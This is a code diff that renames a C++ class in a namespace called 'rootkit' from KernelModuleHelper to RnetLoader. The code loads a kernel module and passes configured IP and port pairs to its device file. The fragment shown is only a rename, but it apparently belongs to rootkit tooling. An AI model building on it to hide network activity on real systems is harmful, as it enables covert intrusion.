@@ -1,4 +1,4 @@
-#include "rootkit/KernelModuleHelper.hpp"
+#include "rootkit/RnetLoader.hpp"
 #include "common.h"
 #include "rootkit/ConfigManager.hpp"
 #include "rootkit/Utils.hpp"
@@ -14,7 +14,7 @@
 #include <cstdint>
 #include <format>
 
-rootkit::KernelModuleHelper::KernelModuleHelper(const KernelModuleConfig& conf,
+rootkit::RnetLoader::RnetLoader(const RnetConfig& conf,
                         const std::string& module_dev_name,
                         const issues::Logger& logger
 )
@@ -66,7 +66,7 @@ rootkit::KernelModuleHelper::KernelModuleHelper(const KernelModuleConfig& conf,
     }
 }
 
-rootkit::KernelModuleHelper::~KernelModuleHelper() {
+rootkit::RnetLoader::~RnetLoader() {
     // Check for error in loading, and if any don't unload the kernel module
     if (!error.empty())
         return;
@@ -76,13 +76,13 @@ rootkit::KernelModuleHelper::~KernelModuleHelper() {
     }
 }
 
-std::optional<std::string> rootkit::KernelModuleHelper::status() const {
+std::optional<std::string> rootkit::RnetLoader::status() const {
     if (!error.empty())
         return error.get_message();
     return std::nullopt;
 }
 
-bool rootkit::KernelModuleHelper::set_data() {
+bool rootkit::RnetLoader::set_data() {
     for (const auto& ip_and_port : conf.ips_and_ports) {
         auto ip = utils::convert_ip(ip_and_port.first);
         if (!ip.has_value()) {
@@ -102,7 +102,7 @@ bool rootkit::KernelModuleHelper::set_data() {
     return true;
 }
 
-bool rootkit::KernelModuleHelper::set_data(const conn_info& data) {
+bool rootkit::RnetLoader::set_data(const conn_info& data) {
     std::string dev_name = "/dev/" + module_dev_name;
     int fd = open(dev_name.c_str(), O_RDWR);
     if (fd < 0) {
@@ -124,6 +124,6 @@ bool rootkit::KernelModuleHelper::set_data(const conn_info& data) {
     return true;
 }
 
-std::vector<conn_info> rootkit::KernelModuleHelper::get_data() const {
+std::vector<conn_info> rootkit::RnetLoader::get_data() const {
     return data;
 }
